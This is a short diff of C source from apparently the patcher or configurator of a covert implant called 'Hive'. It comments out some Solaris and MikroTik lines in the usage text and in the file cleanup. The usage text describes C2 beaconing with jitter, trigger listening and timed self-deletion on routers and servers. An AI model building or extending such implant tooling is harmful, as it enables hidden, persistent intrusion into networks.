@@ -124,7 +124,7 @@ int usage(char **argv)
 	fprintf(stdout, "    %s-K <idKeyFile>%s     - ID key filename (maximum 100 character path)\n", GREEN, RESET);
 	fprintf(stdout, "    %s-k <ID Key Phrase>%s - ID key phrase (maximum 100 character string)\n", GREEN, RESET);
 	fprintf(stdout, "    %s-j <b_jitter>%s      - beacon jitter (integer of percent variance between 0 and 30 [0-30] )\n", GREEN, RESET);
-	fprintf(stdout, "    %s-I <interface>%s     - Solaris Only - interface to listen for triggers\n", GREEN, RESET);
+//	fprintf(stdout, "    %s-I <interface>%s     - Solaris Only - interface to listen for triggers\n", GREEN, RESET);
 	fprintf(stdout, "    %s-P <file path>%s     - (optional) self-delete control/log file directory path [default: /var]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-p <port>%s          - (optional) beacon port [default: 443]\n", GREEN, RESET);
 	fprintf(stdout, "    %s-s <sd_delay>%s      - (optional) self delete delay since last successful trigger/beacon (in seconds) [default: 60 days]\n", GREEN, RESET);
@@ -506,21 +506,19 @@ int main(int argc, char **argv)
 		cl_string((unsigned char *) args.sdpath, sizeof(args.sdpath));
 	}
 
-	remove(HIVE_SOLARIS_SPARC_FILE);
-	remove(HIVE_SOLARIS_X86_FILE);
+//	remove(HIVE_SOLARIS_X86_FILE);
 	remove(HIVE_LINUX_X86_FILE);
 	remove(HIVE_MIKROTIK_X86_FILE);
 	remove(HIVE_MIKROTIK_MIPS_FILE);
-	remove(HIVE_MIKROTIK_MIPSEL_FILE);
+//	remove(HIVE_MIKROTIK_MIPSEL_FILE);
 	remove(HIVE_MIKROTIK_PPC_FILE);
 	remove(HIVE_UBIQUITI_MIPS_FILE);
 
-	remove(HIVE_SOLARIS_SPARC_UNPATCHED);
-	remove(HIVE_SOLARIS_X86_UNPATCHED);
+//	remove(HIVE_SOLARIS_X86_UNPATCHED);
 	remove(HIVE_LINUX_X86_UNPATCHED);
 	remove(HIVE_MIKROTIK_X86_UNPATCHED);
 	remove(HIVE_MIKROTIK_MIPS_UNPATCHED);
-	remove(HIVE_MIKROTIK_MIPSEL_UNPATCHED);
+//	remove(HIVE_MIKROTIK_MIPSEL_UNPATCHED);
 	remove(HIVE_MIKROTIK_PPC_UNPATCHED);
 	remove(HIVE_UBIQUITI_MIPS_UNPATCHED);
 
